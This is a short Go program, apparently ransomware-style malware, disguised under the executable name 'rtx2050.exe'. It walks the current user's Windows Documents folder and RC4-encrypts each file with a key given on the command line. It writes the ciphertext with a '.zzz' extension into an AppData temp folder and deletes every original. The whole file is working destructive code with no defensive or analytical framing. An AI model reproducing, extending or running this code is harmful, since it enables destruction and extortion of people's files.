package main

import (
	"crypto/rc4"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

func createRC4Cipher(userKey string) (*rc4.Cipher, error) {
	key, err := base64.StdEncoding.DecodeString(userKey)
	if err != nil {
		return nil, fmt.Errorf("error decoding base64 key: %v", err)
	}

	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("error creating RC4 cipher: %v", err)
	}
	return cipher, nil
}

func rc4Encrypt(data []byte, userKey string) (string, error) {
	cipher, err := createRC4Cipher(userKey)
	if err != nil {
		return "", err
	}

	// Encrypt the data in-place
	encryptedData := make([]byte, len(data))
	cipher.XORKeyStream(encryptedData, data)

	return base64.StdEncoding.EncodeToString(encryptedData), nil
}

func processFiles(dirPath string, destPath string, userKey string) error {
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Printf("Skipping %s: %v\n", path, err)
			return nil // Skip this file or directory
		}

		if info.IsDir() {
			return nil
		}

		data, err := ioutil.ReadFile(path)
		if err != nil {
			fmt.Printf("Skipping %s: %v\n", path, err)
			return nil // Skip this file if it cannot be read
		}

		encryptedData, err := rc4Encrypt(data, userKey)
		if err != nil {
			return fmt.Errorf("error encrypting data: %v", err)
		}

		encryptedFileName := info.Name() + ".zzz"
		destFilePath := filepath.Join(destPath, encryptedFileName)

		err = ioutil.WriteFile(destFilePath, []byte(encryptedData), 0644)
		if err != nil {
			return fmt.Errorf("error writing encrypted file: %v", err)
		}

		err = os.Remove(path)
		if err != nil {
			fmt.Printf("Warning: Could not delete original file %s: %v\n", path, err)
			return nil // Skip the deletion error but continue
		}

		fmt.Printf("Processed and deleted file: %s\n", path)
		return nil
	})

	return err
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: rtx2050.exe [userkey]")
		return
	}
	userKey := os.Args[1]

	userDocs := filepath.Join(os.Getenv("USERPROFILE"), "Documents")
	destDir := filepath.Join(os.Getenv("APPDATA"), "temp", "zzz")

	err := os.MkdirAll(destDir, 0755)
	if err != nil {
		fmt.Printf("Error creating destination directory: %v\n", err)
		return
	}

	err = processFiles(userDocs, destDir, userKey)
	if err != nil {
		fmt.Printf("Error processing files: %v\n", err)
		return
	}

	fmt.Println("Processing completed.")
}
